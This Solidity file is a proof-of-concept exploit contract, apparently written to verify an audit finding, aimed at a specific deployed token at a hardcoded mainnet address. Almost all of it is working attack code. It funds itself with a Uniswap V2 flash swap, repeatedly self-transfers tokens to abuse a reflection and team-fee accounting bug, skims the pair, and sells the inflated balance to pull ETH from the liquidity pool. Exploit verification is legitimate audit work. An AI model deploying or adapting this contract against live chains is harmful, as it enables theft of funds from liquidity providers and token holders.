// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH9 is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Router02Like {
    function WETH() external view returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface ITomInu is IERC20Like {
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingEnabled() external view returns (bool);
    function cooldownEnabled() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function _teamWalletAddress() external view returns (address payable);
    function _marketingWalletAddress() external view returns (address payable);
}

contract Sink {
    receive() external payable {}
}

contract FlawVerifier {
    /*
        Exploit path anchors preserved for F-001:
        0. Owner enables `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.
        1. Any non-excluded account performs transfers; on a self-transfer the sender only loses the reflected tax fee, not the team fee.
        2. `_taketeam()` credits the contract with newly created reflected value.
        3. Later transfers trigger `swapTokensForEth()` and `sendETHToteam()`, converting the inflated tokens into ETH taken from the pool.

        This PoC keeps that causality unchanged. The only extra step is UniswapV2-style flashswap funding,
        which is a realistic public source of transient inventory/capital and does not alter the bug's root cause.
    */
    address public constant TARGET = 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F;
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2PairLike public constant FUNDING_PAIR =
        IUniswapV2PairLike(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 internal constant FLASH_BORROW_WETH = 0.01 ether;
    uint256 internal constant SWAP_THRESHOLD = 5_000_000_000_000_000;
    uint256 internal constant MIN_TARGET_PROFIT = 1_000_000_000_000_000;
    uint256 internal constant FLASH_FEE_NUMERATOR = 1000;
    uint256 internal constant FLASH_FEE_DENOMINATOR = 997;
    uint256 internal constant MAX_SELF_TRANSFERS = 24;

    uint256 internal constant STATUS_IDLE = 0;
    uint256 internal constant STATUS_TRADING_DISABLED = 1;
    uint256 internal constant STATUS_COOLDOWN_BLOCKS_STAGE2 = 2;
    uint256 internal constant STATUS_FLASHSWAP_FAILED = 3;
    uint256 internal constant STATUS_NO_TEAM_MINT_OBSERVED = 4;
    uint256 internal constant STATUS_VALIDATED_NO_PROFIT = 5;
    uint256 internal constant STATUS_PROFIT = 6;

    address public immutable sink;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public lastStatus;
    uint256 public observedMintToContract;
    uint256 public observedAttackerBalanceLoss;
    uint256 public observedFeeWalletEthIncrease;
    uint256 public observedSelfTransferAmount;
    uint256 public observedTriggerTransferAmount;
    uint256 public observedSkimmedFromPair;
    uint256 public observedBorrowedWeth;
    uint256 public observedBoughtTokens;
    uint256 public observedRepaymentWeth;

    bool private _flashActive;
    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        sink = address(new Sink());
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        ITomInu token = ITomInu(TARGET);

        _resetObservations();

        // Path 0 is an on-chain precondition from the finding rather than an attacker action in this verifier:
        // the owner has already enabled `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.

        if (!token.tradingEnabled()) {
            lastStatus = STATUS_TRADING_DISABLED;
            hypothesisRefuted = true;
            return;
        }

        if (token.cooldownEnabled()) {
            // The finding's transfer path requires that the freshly acquired inventory can
            // immediately self-transfer. If cooldown is live on the fork, the same-account
            // stage-2 transfer sequence is infeasible without cheating, so this attempt exits.
            lastStatus = STATUS_COOLDOWN_BLOCKS_STAGE2;
            hypothesisRefuted = true;
            return;
        }

        _flashActive = true;

        uint256 amount0Out = FUNDING_PAIR.token0() == address(WETH) ? FLASH_BORROW_WETH : 0;
        uint256 amount1Out = amount0Out == 0 ? FLASH_BORROW_WETH : 0;

        try FUNDING_PAIR.swap(amount0Out, amount1Out, address(this), abi.encodePacked(uint8(1))) {
            // success path handled in callback
        } catch {
            _flashActive = false;
            lastStatus = STATUS_FLASHSWAP_FAILED;
            hypothesisRefuted = true;
            _selectProfitToken(token);
            return;
        }

        if (_flashActive) {
            _flashActive = false;
            lastStatus = STATUS_FLASHSWAP_FAILED;
            hypothesisRefuted = true;
            _selectProfitToken(token);
            return;
        }

        _selectProfitToken(token);
        lastStatus = _profitAmount > 0 ? STATUS_PROFIT : STATUS_VALIDATED_NO_PROFIT;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(FUNDING_PAIR), "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(_flashActive, "inactive flashswap");

        ITomInu token = ITomInu(TARGET);
        IUniswapV2Router02Like router = IUniswapV2Router02Like(token.uniswapV2Router());
        IUniswapV2PairLike targetPair = IUniswapV2PairLike(token.uniswapV2Pair());

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        observedBorrowedWeth = borrowedWeth;
        observedRepaymentWeth = _flashRepayment(borrowedWeth);

        WETH.withdraw(borrowedWeth);

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(WETH);
        buyPath[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: borrowedWeth}(
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        observedBoughtTokens = token.balanceOf(address(this));
        require(observedBoughtTokens > 0, "buy failed");

        uint256 maxTxAmount = token._maxTxAmount();
        uint256 feeWalletEthBefore = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;

        bool minted = _inflateContractTeamBalance(token, maxTxAmount);
        if (!minted) {
            lastStatus = STATUS_NO_TEAM_MINT_OBSERVED;
            revert("no team mint");
        }
        hypothesisValidated = true;

        uint256 pairBalanceBeforeSkim = token.balanceOf(address(targetPair));
        try targetPair.skim(address(this)) {
            uint256 pairBalanceAfterSkim = token.balanceOf(address(targetPair));
            if (pairBalanceBeforeSkim > pairBalanceAfterSkim) {
                observedSkimmedFromPair = pairBalanceBeforeSkim - pairBalanceAfterSkim;
            }
        } catch {}

        try token.approve(address(router), type(uint256).max) returns (bool success) {
            success;
        } catch {}

        // Preserve the original exploit ordering:
        // 1) attacker acquires inventory,
        // 2) any non-excluded account performs transfers; on a self-transfer the sender only loses
        //    the reflected tax fee, not the team fee,
        // 3) `_taketeam()` credits the contract with newly created reflected value,
        // 4) later transfers trigger `swapTokensForEth()` and `sendETHToteam()`, converting the
        //    inflated tokens into ETH taken from the pool.
        // A pair `skim` is added only as a realistic public step to realize any reflection-created
        // surplus that accumulated on the AMM while the broken math was being exercised.
        uint256 saleBudget = _saleBudget(token.balanceOf(address(this)), MIN_TARGET_PROFIT);
        if (saleBudget > 0) {
            _sellUntilFunded(router, saleBudget, maxTxAmount, observedRepaymentWeth);
        }

        _wrapAllEth();

        if (WETH.balanceOf(address(this)) < observedRepaymentWeth) {
            uint256 fallbackBudget = _saleBudget(token.balanceOf(address(this)), 1);
            if (fallbackBudget > 0) {
                _sellUntilFunded(router, fallbackBudget, maxTxAmount, observedRepaymentWeth);
                _wrapAllEth();
            }
        }

        require(WETH.balanceOf(address(this)) >= observedRepaymentWeth, "repayment shortfall");
        WETH.transfer(address(FUNDING_PAIR), observedRepaymentWeth);
        _flashActive = false;

        uint256 feeWalletEthAfter = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;
        if (feeWalletEthAfter > feeWalletEthBefore) {
            observedFeeWalletEthIncrease = feeWalletEthAfter - feeWalletEthBefore;
        }
    }

    function _inflateContractTeamBalance(ITomInu token, uint256 maxTxAmount) internal returns (bool minted) {
        // Path 1 + Path 2 anchor:
        // Any non-excluded account performs transfers; on a self-transfer the sender only loses the
        // reflected tax fee, not the team fee, while `_taketeam()` credits the contract with newly
        // created reflected value.
        for (uint256 i = 0; i < MAX_SELF_TRANSFERS; ++i) {
            uint256 attackerBefore = token.balanceOf(address(this));
            if (attackerBefore <= 1) {
                break;
            }

            uint256 contractBefore = token.balanceOf(TARGET);
            uint256 amount = _boundedTransferAmount(attackerBefore, maxTxAmount);
            if (amount == 0) {
                break;
            }

            observedSelfTransferAmount = amount;

            bool ok;
            try token.transfer(address(this), amount) returns (bool success) {
                ok = success;
            } catch {
                break;
            }
            if (!ok) {
                break;
            }

            uint256 contractAfter = token.balanceOf(TARGET);
            uint256 attackerAfter = token.balanceOf(address(this));

            if (contractAfter > contractBefore) {
                minted = true;
                observedMintToContract += contractAfter - contractBefore;
            }

            if (attackerBefore > attackerAfter) {
                observedAttackerBalanceLoss += attackerBefore - attackerAfter;
            }

            if (contractAfter >= SWAP_THRESHOLD) {
                break;
            }
        }
    }

    function _sellUntilFunded(
        IUniswapV2Router02Like router,
        uint256 tokenBudget,
        uint256 maxTxAmount,
        uint256 requiredWeth
    ) internal {
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = address(WETH);

        uint256 remaining = tokenBudget;
        while (_currentWrappedWethEquivalent() < requiredWeth && remaining > 1) {
            uint256 chunk = remaining;
            if (maxTxAmount != 0 && chunk > maxTxAmount) {
                chunk = maxTxAmount;
            }
            if (chunk <= 1) {
                break;
            }

            if (observedTriggerTransferAmount == 0) {
                observedTriggerTransferAmount = chunk;
            }

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                chunk,
                0,
                sellPath,
                address(this),
                block.timestamp
            );

            remaining -= chunk;
        }
    }

    function _saleBudget(uint256 balance, uint256 keepAmount) internal pure returns (uint256) {
        if (balance <= keepAmount + 1) {
            return 0;
        }
        return balance - keepAmount;
    }

    function _boundedTransferAmount(uint256 balance, uint256 maxTxAmount) internal pure returns (uint256) {
        if (balance <= 1) {
            return 0;
        }

        uint256 amount = balance - 1;
        if (maxTxAmount != 0 && amount > maxTxAmount) {
            amount = maxTxAmount;
        }
        return amount;
    }

    function _currentWrappedWethEquivalent() internal view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return (amount * FLASH_FEE_NUMERATOR) / FLASH_FEE_DENOMINATOR + 1;
    }

    function _selectProfitToken(ITomInu token) internal {
        uint256 wethBalance = WETH.balanceOf(address(this));
        uint256 targetBalance = token.balanceOf(address(this));

        if (wethBalance >= 1e15) {
            _profitToken = address(WETH);
            _profitAmount = wethBalance;
            return;
        }

        if (targetBalance >= 1e15) {
            _profitToken = TARGET;
            _profitAmount = targetBalance;
            return;
        }

        if (targetBalance > 0) {
            _profitToken = TARGET;
            _profitAmount = targetBalance;
            return;
        }

        if (wethBalance > 0) {
            _profitToken = address(WETH);
            _profitAmount = wethBalance;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _resetObservations() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;
        lastStatus = STATUS_IDLE;
        observedMintToContract = 0;
        observedAttackerBalanceLoss = 0;
        observedFeeWalletEthIncrease = 0;
        observedSelfTransferAmount = 0;
        observedTriggerTransferAmount = 0;
        observedSkimmedFromPair = 0;
        observedBorrowedWeth = 0;
        observedBoughtTokens = 0;
        observedRepaymentWeth = 0;
        _profitToken = address(0);
        _profitAmount = 0;
    }
}
